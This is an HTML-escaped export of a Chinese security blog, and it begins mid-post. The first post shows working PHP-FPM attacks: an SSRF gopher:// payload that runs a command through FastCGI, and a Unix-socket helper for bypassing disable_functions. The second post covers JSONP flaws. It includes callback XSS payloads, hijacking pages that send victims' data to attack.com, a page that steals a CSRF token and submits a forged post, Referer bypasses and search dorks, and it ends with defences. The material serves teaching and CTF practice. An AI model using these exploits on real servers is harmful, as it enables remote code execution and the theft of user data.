'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; response = client.request(params, content) response = urllib.quote(response) print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + response) 攻击利用前提条件是目标站点存在SSRF漏洞，代码如下： 1234567891011&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); &#125;$url = $_GET['url'];curl($url);?&gt; 而且目标站点的PHP-FPM服务只在本地监听，外网访问不了，这里我们外网用nmap扫发现被过滤了： 此时，直接用前面改过的脚本，运行如下命令，FPM地址写本地就好： 1python fpm_ssrf.py -c &apos;&lt;?php echo `id`;exit;?&gt;&apos; -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php 得到如下Gopher协议包数据： 1gopher://127.0.0.1:9000/_%01%01z1%00%08%00%00%00%01%00%00%00%00%00%00%01%04z1%01%E7%00%00%0E%02CONTENT_LENGTH23%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04z1%00%00%00%00%01%05z1%00%17%00%00%3C%3Fphp%20echo%20%60id%60%3Bexit%3B%3F%3E%01%05z1%00%00%00%00 在打SSRF之前，需要再进行一次URL编码，这是因为在服务端中Nginx和FPM分别会进行一次URL解码： 编码后直接SSRF打过去就好了： 0x06 攻击Unix套接字模式下的PHP-FPM前面说的Unix Socket模式就讲到，这种模式在同一环境下是通过如/run/php/php7.3-fpm.sock的sock文件来进行通信的。 具体的攻击场景可参考*CTF echohub这道题，题目做到后面是涉及到如何绕过disable_functions，而从题目中获取的信息可知服务器是还存在一个FPM服务且是以Unix套接字模式进行通信的。 如何攻击利用呢？ 这里参考了ROIS的wp，由于stream_socket_client()函数未被禁用，因此我们可以利用它来和本地Unix套接字模式的FPM服务进行通信，下面的脚本是建立一个Unix Socket客户端连接，然后写入TCP流进行通信，内容是我们恶意构造的FastCGI协议报文： 1234567&lt;?php $sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock, base64_decode($_POST['A']));var_dump(fread($sock, 4096));?&gt;//来自https://xz.aliyun.com/t/5006#toc-3 //ROIS的*CTF WP 将该PHP文件上传到目标服务端，等待我们发送的Unix Socket连接来传输TCP流数据、。 接着，在前面SSRF脚本的基础上，改掉最后的几行代码，将URL编码和拼接Gopher协议部分注释掉，取而代之的是对FastCGI协议报文进行base64编码并输出出来： 12345response = client.request(params, content)# response = urllib.quote(response)# print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + response)response = base64.b64encode(response)print(response) 运行后得到base64编码内容： 最后，只需将编码后的内容发到前面上传的PHP文件中和FPM服务进行Unix Socket通信，从而绕过disable_functions、达到任意命令执行的目的。 由于已无题目环境，这里就无截图了。 0x07 助攻disable_functions绕过具体的可参考《从蚁剑插件看利用PHP-FPM绕过disable_functions》。 0x08 参考【运维安全】Fastcgi配置不当对外开放利用 浅析php-fpm的攻击方式 PHP 连接方式介绍以及如何攻击 PHP-FPM Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"JSONP跨域漏洞总结","date":"2019-08-20T13:19:12.000Z","path":"2019/08/20/JSONP跨域漏洞总结/","text":"JSONP是个老话题了，因为不太熟悉这里就总结下吧。 0x01 JSONP为何使用JSONPJSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。 简单说个情形就能理解了，不贴图了。 假设a.com下存在data.json文件： 1&#123; username: \"mi1k7ea\", password: \"secret\" &#125; 而下面的html文件用于发起Ajax请求获取data.json的内容并记录日志： 12345678910&lt;script src='./jquery.js'&gt;&lt;/script&gt;&lt;script &gt; $.ajax(&#123; url: 'http://a.com/data.json', type:\"get\", dataType: \"json\", success: function (data) &#123; console.log(data);&#125; &#125;)&lt;/script&gt; 如果该HTML文件同处于a.com即和data.json同域时，访问该HTML文件能够正常获取json文件的内容。 但是如果该HTML文件放置在b.com下即与data.json文件不同域，访问该HTML文件时浏览器会报错，这是因为Ajax不能发起跨域请求。 但是开发为了方便程序间数据的调用，就搞了几种跨域的方法，其中包括了JSONP。 简单地说，就是利用script标签的src属性能够发起跨域请求的原理来实现的。 将该HTML文件改为： 12345678&lt;body&gt; &lt;script src='./jquery.js'&gt;&lt;/script&gt; &lt;script&gt; var s = document.createElement('script'); s.src = 'http://a.com/data.json'; document.body.appendChild(s); &lt;/script&gt;&lt;/body&gt; 此时再访问就发现可以跨域发起请求了，但是会看到浏览器报错，这时因为data.json中的内容并不符合JavaScript代码规范。 重新定义data.json文件让其符合JSONP规范： 1callback(&#123; username: \"mi1k7ea\", password: \"secret\" &#125;) 然后在HTML文件中添加callback函数的定义即可： 1234567891011&lt;body&gt; &lt;script src='./jquery.js'&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; function callback(json) &#123; console.log(json); &#125; var s = document.createElement('script'); s.src = 'http://a.com/data.json'; document.body.appendChild(s); &lt;/script&gt;&lt;/body&gt; 此时，基本的JSONP功能就实现了，我们Web站点的HTML文件能够正常地跨域获取目标外域JSON数据了。 至此，我们就清楚了：JSONP就是跨域技术的一种，用来方便Web站点突破SOP的限制从外域端点获取数据。 基本原理过遍JSON和JSONP的基本概念吧。 JSON（JavaScript Object Notation），即JavaScript对象表示法。 JSONP（JSON with Padding）即填充式的JSON，通过填充额外的内容把JSON数据包装起来，变成一段有效的可以独立运行的JavaScript语句。它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。 JSONP的基本语法为：callback({“name”:”alan”, “msg”:”success”}) 常见的例子包括函数调用（如callback({“a”:”b”})）或变量赋值（var a={JSON data}）。 更多原理详解，推荐看看这篇文章：jsonp原理详解——终于搞清楚jsonp是啥了 实现流程Demo这里主要借鉴菜鸟教程的示例。 原生形式jsonp.php，作为JSONP端点，动态生成JSONP格式数据，文件放置在第三方服务器中： 123456789&lt;?phpheader('Content-type: application/json');//获取回调函数名$jsoncallback = htmlspecialchars($_REQUEST ['callback']);//json数据$json_data = '[\"mi1k7ea\",\"https://www.mi1k7ea.com\"]';//输出jsonp格式的数据echo $jsoncallback . \"(\" . $json_data . \")\";?&gt; jsonp.html，先在script标签中定义，再通过另一个script标签的src属性来实现跨域访问目标JSONP端点获取根据传参动态生成的JSONP数据，文件放置于本地服务器中： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;JSONP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"here\"&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt;function callbackFunction(result, methodName)&#123; var html = '&lt;ul&gt;'; for(var i = 0; i &lt; result.length; i++) &#123; html += '&lt;li&gt;' + result[i] + '&lt;/li&gt;'; &#125; html += '&lt;/ul&gt;'; document.getElementById('here').innerHTML = html;&#125;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.17.166:81/jsonp.php?callback=callbackFunction\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 直接在访问本地服务器的jsonp.html，看到其跨域访问JSONP端点获取并解析JSONP数据，显示到页面中： Jquery的三种形式$.getJSON123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;JSONP Test&lt;/title&gt; &lt;script src=\"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js\"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id=\"here\"&gt;&lt;/div&gt;&lt;script&gt;$.getJSON(\"http://192.168.17.166:81/jsonp.php?callback=?\", function(data) &#123; var html = '&lt;ul&gt;'; for(var i = 0; i &lt; data.length; i++) &#123; html += '&lt;li&gt;' + data[i] + '&lt;/li&gt;'; &#125; html += '&lt;/ul&gt;'; $('#here').html(html); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; $.ajax12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;JSONP Test&lt;/title&gt; &lt;script src=\"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js\"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id=\"here\"&gt;&lt;/div&gt;&lt;script&gt;$(function()&#123; // 使用ajax来调用jsonp $.ajax(&#123; type: \"get\", //jsonp默认为get请求，即使写post也会转换成get方式 async: false, // jsonp默认为false，即使写true也会转换成false url: \"http://192.168.17.166:81/jsonp.php\", // 服务端地址 // data: &#123;\"code\" : \"CA1405\"&#125;, // 入参 dataType: \"jsonp\", // jsonp调用固定写法 jsonp: \"callback\", // 传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)。即：?callback=xxx中的callback部分 // jsonpCallback:\"flightHandler\",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写\"?\"，jQuery会自动为你处理数据。即：?callback=xxx中的xxx部分 success: function(data)&#123; // 调用成功之后的方法 var html = '&lt;ul&gt;'; for(var i = 0; i &lt; data.length; i++) &#123; html += '&lt;li&gt;' + data[i] + '&lt;/li&gt;'; &#125; html += '&lt;/ul&gt;'; $('#here').html(html); &#125;, error: function()&#123; // 调用失败之后的方法 alert('error'); &#125; &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; $.get1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;JSONP Test&lt;/title&gt; &lt;script src=\"https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js\"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id=\"here\"&gt;&lt;/div&gt;&lt;script&gt;$.get('http://192.168.17.166:81/jsonp.php?callback=?', function (data) &#123; var html = '&lt;ul&gt;';for(var i = 0; i &lt; data.length; i++)&#123;html += '&lt;li&gt;' + data[i] + '&lt;/li&gt;';&#125;html += '&lt;/ul&gt;';$('#here').html(html); &#125;, 'jsonp'); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 0x02 JSONP跨域漏洞JSONP跨域漏洞主要是callback自定义导致的XSS和JSONP劫持。 callback自定义导致的XSS我们知道，在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来。 如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。 未设置Content-Type且未过滤我们先看下默认情况下未设置Content-Type且未对callback参数进行过滤的场景，这种情形是最基础也是最常见的，网上大多数的JSONP引起的XSS都是这种场景的。 JSONP端点的代码如下，data.php： 12345678&lt;?phpif(isset($_GET['callback']))&#123; $callback = $_GET['callback']; print $callback.'(&#123;\"username\" : \"mi1k7ea\", \"password\" : \"thisispassword\"&#125;);';&#125; else &#123; echo 'No callback param.';&#125;?&gt; 正常访问会在页面返回JSONP数据： 当输入XSS payloadcallback=hello&lt;script&gt;alert(0)&lt;/script&gt;时，会弹框，且可以看到响应报文在未设置Content-Type情况下其值为text/html： 几种Content-Type设置探讨接着我们探讨下几种不同的Content-Type是否会造成XSS。 application/json查阅资料发现：JSON文本的MIME媒体类型是application/json，默认编码为UTF-8。同时这也是建议的JSONP端点设置的Content-Type值，用于防御XSS。 我们直接在前面data.php中添加设置Header字段的代码即可： 123456789&lt;?phpheader('Content-type: application/json');if(isset($_GET['callback']))&#123; $callback = $_GET['callback']; print $callback.'(&#123;\"username\" : \"mi1k7ea\", \"password\" : \"thisispassword\"&#125;);';&#125; else &#123; echo 'No callback param.';&#125;?&gt; 此时无论正常访问还是注入XSS payload，页面都不会显示内容出来： 但我们在浏览器查看原始数据的时候是有JSONP数据返回的，但就是不会在页面中解析该内容： 这种情形，在哪个浏览器尝试都不会弹框，因为此时浏览器不再将响应返回内容当成HTML文档来解析了，而是将其视为JSON数据，但由于该数据是JSONP格式的而不是JSON格式的，当浏览器尝试解析JSON数据时会报错。然而这一切如果只是在几个文件或接口之间JSONP数据的调用，则是不会有问题的，因为它不需要浏览器显示出来而只是取其中的数据而已。 text/jsontext/json是application/json正式注册之前，JSON的实验版MIME类型。 将data.php中对应的字段值改为text/json，再访问，可以看到页面原封不动地返回数据，但浏览器不会解析其中的内容，不会弹框： 这种情形处理会将响应内容显示在页面上，但浏览器同样不会将该内容当成HTML文档来解析，同时也没有去按JSON格式解析内容，因此没有报错。 application/javascript与text/javascript其实，JSONP格式的数据就是JS数据，其返回的内容就是传入参数的JS函数的调用。 application/javascript是JavaScript的正式注册的MIME媒体类型。 因此，可能会有些程序员在设置Content-Type时，会将其设置为application/javascript，将响应的JSONP内容正确地设置为JS类型。 我们修改data.php中对应的Content-Type值为application/javascript再看看，在Chrome和Firefox下确实没有弹框： 但是换到非最新版的IE就会弹了，我本地IE更新到最新的只是提示是否下载该文件而已。 另外，text/javascript的效果是一样的，其是application/javascript的测试版。 X-Content-Type-Options如果在响应报文中X-Content-Type-Options字段被设置为nosniff，Content-Type必须设置为JavaScript（application/javascript或text/javascript）才能在浏览器中运行。 这是因为在响应中包含回调产生的问题，这时响应不再解析JSON而是解析JS。 JSONP劫持JSONP劫持其实和CSRF的攻击是类似的，只不过CSRF是提交表单请求，而JSONP劫持是将请求JSONP端点获取到的JSONP数据发往攻击者服务器中、实现获取JSONP敏感信息。 因此，JSONP劫持的前提和CSRF是一样的，当服务端没有校验请求来源，如未严格校验Referer或未存在token机制等，都会导致JSONP劫持的产生。 我们经常会听到JSON劫持和JSONP劫持，两者有啥区别，下面简单说下。 JSON劫持与JSONP劫持简单地说，JSONP劫持属于JSON劫持的一种。 JSON劫持JSON劫持即JSON Hijacking，攻击过程类似CSRF，区别在于CSRF只管发送表单请求，但是JSON劫持则是获取JSON格式的敏感数据。 通常，有些Web应用会把一些敏感数据以JSON形式返回到前端，如果仅仅通过cookie来判断请求是否合法，那么就可以利用类似CSRF的手段，向目标服务器发送请求，以获得敏感数据。 当JSON数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将JSON数据发送给第三方即攻击者的代码。 下面结合简单的示例讲下JSON劫持的原理，参考自Spoock。 比如目标站点存在可直接访问JSON数据，其可通过GET请求如www.good.com/user/mail.json来进行访问，同时这个请求没有对用户的身份进行严格的认证，那么当用户访问一个恶意站点的时候，恶意站点同样包含获取www.good.com/user/mail.json的GET请求，再通过JSON劫持的方式就可以获取到用户的敏感JSON数据，然后发送到恶意的站点。 整个过程的流程图如下所示： 关键的步骤是第4步和第7步。当用户访问恶意站点之后，从正常站点将JSON数据下载下来之后，如何发送到恶意站点上去。 这里，我们的恶意页面仅仅是通过script标签的src属性进行导入： 1&lt;script src=\"www.good.com/data.json\"&gt;&lt;/script&gt; 新建data.json文件如下： 123456&#123; \"fname\":\"Mi1k\", \"lname\":\"7ea\", \"phone\":\"666666\", \"email\":\"mi1k7ea@163.com\"&#125; 当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，就会导致请求目标敏感JSON文件。 JSON数据从服务器端到达浏览器之后，会被浏览器解析为JavaScript中的Object的实例。在这种情况下，只要重写Object类的set方法，就可以获取到想要的数据，这就是JSON劫持的实现，以下就是攻击代码： 123456789&lt;script type=\"text/javascript\"&gt;Object.defineProperty(Object.prototype,\"email\",&#123; set:function(obj) &#123; // send data to www.bad.com senddata2badsute(obj) &#125;&#125;);&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"www.good.com/data.json\"/&gt; 我们为Object类的email属性设置一个Hook函数。在JavaScript中所有的类都是继承至Object类，所以defineProperty()这个方法为所有的对象的email属性都增加了一个Hook函数。当有对象设置email属性的时候，就会运行上面这段代码。所以当浏览器获取到了json数据，要将json数据转化为JavaScript对象的时候，由于json数据中存在email属性的设置，此时就会触发Hook函数，而这个函数就会将数据传送到攻击者。这个过程就完成了json数据的劫持了。 PS:目前网络上关于这方面的资料大部分都是2012年之前的，此时我尝试进行重新的时候，发现已经无法实现了。说明浏览器目前已经修复了这个漏洞。关于hook对象的属性设置目前的实现方法与之前的方法也相同了。 我们本地试下就知道了，当我们通过.属性的方式赋值时是会弹框的： 1234567891011&lt;script type=\"text/javascript\"&gt;Object.defineProperty(Object.prototype,\"Id\",&#123; set:function(obj) &#123; alert(obj); &#125;&#125;);&lt;/script&gt;&lt;script&gt;var a = new Object();a.Id = 666;&lt;/script&gt; 但是如果我们是直接声明并且赋值给一个对象，这个时候就不会触发这个事件： 12345678910&lt;script type=\"text/javascript\"&gt;Object.defineProperty(Object.prototype,\"Id\",&#123; set:function(obj) &#123; alert(obj); &#125;&#125;);&lt;/script&gt;&lt;script&gt;var b=&#123;\"Id\":123&#125;;&lt;/script&gt; 而由目标JSON端点返回的数据都是{‘a’:’b’}的形式，即我们恶意页面接收到JSON数据时在script标签是通过直接声明并且赋值的形式来赋值给对象的，从而也不会导致弹框。换句话说，就是现在的浏览器已经对这种JSON劫持漏洞进行了防御，我们没有办法通过Hook JS函数来实现JSON劫持了。 小结一下 当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，而恶意页面是向目标JSON文件发起请求并获取响应； 因为script标签会自动解析请求回来的JSON数据并生成对应的JS对象，此时我们只需要再通过Object.prototype.__defineSetter__这个函数来进行Hook，就能实现将获取到的JSON数据往外发送给攻击者，从而成功导致JSON劫持； 但是该函数在当前的新版本chrome和firefox中都已经失效了，浏览器早已对此JSON劫持漏洞进行了修补。 JSONP劫持前面JSON劫持的通用方法其实已经早已被浏览器防御住了，但由于JSONP的出现，导致JSON劫持多了一种JSONP的形式，这是因为JSONP数据其实就是往JS函数中传参进行调用，这就导致了攻击者在恶意页面编写恶意的JS函数，通过JSONP的调用来执行该恶意JS函数、将敏感JSONP数据发往攻击者服务器中。 具体的看下面的Demo即可。 Demo1——窃取用户信息这里我们模拟一个登录站点，登录后可与JSONP端点交互获取用户信息；而攻击者则是在自己服务器放置恶意HTML文件来尝试劫持用户JSONP数据。 main.php，放置于目标站点，用于用户登录以及与JSONP端点交互获取用户信息： 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);session_start();$name = $_GET[&apos;name&apos;];$pwd = $_GET[&apos;pwd&apos;];if($name===&apos;admin&apos; &amp;&amp; $pwd === &apos;admin&apos; || $name===&apos;guest&apos; &amp;&amp; $pwd === &apos;guest&apos;)&#123; $_SESSION[&apos;name&apos;] = $name;&#125;if (isset($_GET[&apos;logout&apos;])) &#123; if ($_GET[&apos;logout&apos;] === &apos;1&apos;) &#123; unset($_SESSION[&apos;name&apos;]); &#125;&#125;echo &apos;&lt;a href=&quot;http://victim.com/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&apos;;echo &apos;&lt;a href=&quot;http://victim.com/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&apos;;if(!$_SESSION[&apos;name&apos;])&#123; echo &apos;&lt;html&gt; &lt;head&gt; &lt;title&gt;登录&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;main.php&quot; method=&quot;get&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;&apos;;&#125;else&#123; echo &quot;欢迎您, &quot;.$_SESSION[&apos;name&apos;].&quot;&lt;br data-tomark-pass&gt;&quot;;&#125;?&gt; info.php，放置于目标服务器中，JSONP端点，用于提供指定用户的信息，注意这里设置了Content-Type为application/json，防御了JSONP XSS漏洞： 12345678910111213&lt;?phpheader('Content-type: application/json');error_reporting(0);session_start();$callback = $_GET['callback'];if($_SESSION['name'] === 'admin')&#123; echo $callback.\"(&#123;'id':1,'name':'mi1k7ea_admin'&#125;)\";&#125; elseif($_SESSION['name'] === 'guest') &#123; echo $callback.\"(&#123;'id':2,'name':'mi1k7ea_guest'&#125;)\";&#125; else &#123; echo $callback.\"获取个人信息失败\";&#125;?&gt; hijacking.html，放置在攻击者服务器中，用于诱使受害者访问，以窃取目标站点JSONP端点的敏感信息并发往攻击者服务器中： 123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt; &lt;title&gt;lol&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;script type=\"text/javascript\" src=\"./jquery.js\"&gt;&lt;/script&gt;&lt;script&gt; function jsonp_hack(v)&#123; alert(\"JSONP hijacking\"); var h = ''; for(var key in v)&#123; var a = ''; a = key + ' : ' + v[key] + ' ,'; h += a; &#125; alert(h); $.get('http://attack.com/index.html?value='+h); &#125;&lt;/script&gt;&lt;script src=\"http://victim.com/info.php?callback=jsonp_hack\"&gt;&lt;/script&gt;&lt;body&gt; &lt;h1&gt;Welcome&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 用户访问目标站点main.php，是个登录界面： 直接点击用户信息返回失败，因为没有登录，另外由于这里响应包Content-Type为application/json，因此在浏览器页面是看不到返回的JSONP数据的，只能在开发者工具中查看原始数据看到： 接着用户登录admin账号，此时再点击用户信息能够正常查看： 此后，攻击者向用户发送恶意链接诱使用户点击访问，当用户被诱导访问该恶意链接之后，恶意页面就会窃取JSONP端点数据并通过XHR的方式发往攻击者的服务器： 可以看到，弹完框后，会向攻击者目标站点通过GET方式发送JSONP端点敏感信息。 我们在ceye中验证，确实收到了劫持的JSONP数据： Demo2——劫持token下面的示例模拟通过JSONP劫持窃取token来发表文章的情形。 add_article.php，放置于目标服务器中，功能是发表文章，前提是token值成功校验通过： 123456789101112131415161718192021&lt;?phpif(!empty($_POST['token']))&#123; $csrf_token = $_POST['token']; $title = $_POST['title']; $content = $_POST['content']; if ($csrf_token === 'NKJJDkajwdadwdad_csrf_token_test') &#123; echo '文章发表成功~'.'&lt;/br&gt;'; echo $title.'&lt;/br&gt;'; echo $content; &#125; else &#123; echo 'csrf token error'; &#125;&#125;else&#123; echo 'no token';&#125;?&gt; token.php，放置于JSONP端点，用于动态生成JSONP数据，其中包含token内容： 123456789&lt;?phpheader('Content-type: application/json');if(isset($_GET['callback']))&#123; $callback = $_GET['callback']; print $callback.'(&#123;\"username\" : \"mi1k7ea\", \"password\" : \"thisispassword\", \"token\" : \"NKJJDkajwdadwdad_csrf_token_test\"&#125;);';&#125; else &#123; echo 'No callback param.';&#125;?&gt; jsonp.html，攻击者用于诱使用户访问的文件，放置于攻击者服务器中，用于访问目标JSONP端点获取token之后，再带上该token向目标服务器的add_article.php发起请求来发表文章： 12345678910111213141516171819202122&lt;html&gt;&lt;head&gt;&lt;title&gt;JSONP Hijacking&lt;/title&gt;&lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"http://192.168.17.166:81/add_article.php\" method=\"POST\" id=\"csrfsend\"&gt;&lt;input type=\"hidden\" name=\"content\" value=\"Hacked by mi1k7ea!\"&gt;&lt;input type=\"hidden\" name=\"title\" value=\"Oops!\"&gt;&lt;input type=\"hidden\" id=\"token\" name=\"token\" value=\"\"&gt;&lt;/form&gt;&lt;script type=\"text/javascript\"&gt;function exp(obj)&#123; console.log(obj); var token = obj[\"token\"]; document.getElementById(\"token\").value = token; document.getElementById(\"csrfsend\").submit();&#125;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.17.166:81/token.php?callback=exp\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当用户被诱使访问该恶意页面时，会成功创建文章： Referer绕过有些时候，目标服务端会校验Referer字段，此时可以根据一些特定设置进行特定的绕过。 空Referer有时候程序对Referer进行了校验，但并未对空Referer进行校验，此时我们就可以使用置空的Referer请求来绕过。 实现发送空Referer的请求的方法有三种： 使用iframe标签+javascript伪协议 从HTTPS向HTTP发起请求 使用meta标签 使用iframe标签+javascript伪协议 原理就是在恶意HTML中，给iframe标签的src属性赋值为javascript://伪协议内容，其中具体内容为和之前一样的定义两个script标签、一个定义callback函数具体操作、另一个则是通过script标签的src属性向目标JSONP端点发起跨域请求。 jsonp.html，恶意页面，iframe标签通过javascript伪协议定义script标签的src属性来跨域访问目标JSONP端点，并弹框显示password内容： 123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;JSONP Hijacking&lt;/title&gt;&lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe src=\"javascript:'&lt;script&gt;function exp(o)&#123;alert(o.password);&#125;&lt;/script&gt;&lt;script src=http://192.168.17.166:81/data.php?callback=exp&gt;&lt;/script&gt;'\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; data.php，目标JSONP端点，保存着用户数据： 123456789&lt;?phpheader('Content-type: application/json');if(isset($_GET['callback']))&#123; $callback = $_GET['callback']; print $callback.'(&#123;\"username\" : \"mi1k7ea\", \"password\" : \"thisispassword\"&#125;);';&#125; else &#123; echo 'No callback param.';&#125;?&gt; 用户访问恶意页面后，正常弹框显示目标JSONP端点的password数据，可以看到请求头并不存在Referer： 使用meta标签 实现方法就是在我们实现的JSONP劫持的HTML文档中加上meta标签来实现： 1&lt;meta name=\"referrer\" content=\"never\"&gt; 这里我们以Demo1来试下效果，在hijacking.html中插入meta标签： 12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt; &lt;title&gt;lol&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"referrer\" content=\"never\"&gt;&lt;/head&gt;&lt;script type=\"text/javascript\" src=\"./jquery.js\"&gt;&lt;/script&gt;&lt;script&gt; function jsonp_hack(v)&#123; alert(\"JSONP hijacking\"); var h = ''; for(var key in v)&#123; var a = ''; a = key + ' : ' + v[key] + ' ,'; h += a; &#125; alert(h); $.get('http://attack.com/index.html?value='+h); &#125;&lt;/script&gt;&lt;script src=\"http://victim.com/info.php?callback=jsonp_hack\"&gt;&lt;/script&gt;&lt;body&gt; &lt;h1&gt;Welcome&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 看下效果吧，添加之前是有Referer的： 添加之后就没有了： Referer过滤不严格当然，Referer过滤不严格的情况各种各样，具体的需要自行进行针对性的分析和绕过。 如果是判断Referer是否存在白名单域名，如只是判断Referer字段值中是否存在mi1k7ea.com字样。那么此时攻击者可以通过子域名的方式如http://www.mi1k7ea.com.attack.com/attack.html 或者在域名前面增加随机的a-z和0-9或者构造http://www.attack.com/attack.html?mi1k7ea.com这样的页面来发起攻击实现绕过Referer防御。 0x03 搜索方法当然还是Google Hack大法，如： 123inurl:jsoninurl:callback=site:a.com inurl:json 常见关键字有： 1234567891011callbackjsoncallbackjsonpcallbackjsoncalljsonpcallcbjsoncbjsonpcb=json=jsonp=jQuery 此外，还可以在对目标站点浏览时，打开F12开发者工具，点击network窗口并勾选preserve log，查看请求记录并进行关键词筛选。 筛选过后需要确实是否是真的JSONP方法，我们将目标URL填入下面的script标签的src中，将callback参数值改为我们自己定义的JS函数callback即可： 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;JSONP Hijacking&lt;/title&gt;&lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\" src=\"./jquery-3.3.1.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; function callback(v)&#123; console.log(v); &#125; var s = document.createElement('script'); s.src = 'http://sapi.beibei.com/resource/utm_source.html?callback=callback'; document.body.appendChild(s);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 修改之后访问该HTML文件，若在浏览器的控制台看到输出了JSONP数据内容，则确定是真的JSONP端点。这里访问的是贝贝网的API： 至于信息是否有用，得看看价值了。 0x04 防御 若可行，则使用CORS替换JSONP实现跨域功能； 应用CSRF防御措施来调用JSON文件：限制Referer 、部署Token等； 严格设置Content-Type及编码（Content-Type: application/json; charset=utf-8 ）； 严格过滤 callback 函数名及JSON里数据的输出； 严格限制对JSONP输出callback函数名的长度（如防御Flash输出的方法）； 0x05 参考JSONP 安全攻防技术 JSONP注入解析 对jsonp劫持的一次简单了解 JSONP 教程 Json劫持与jsonp劫持的区别 Json劫持漏洞简介 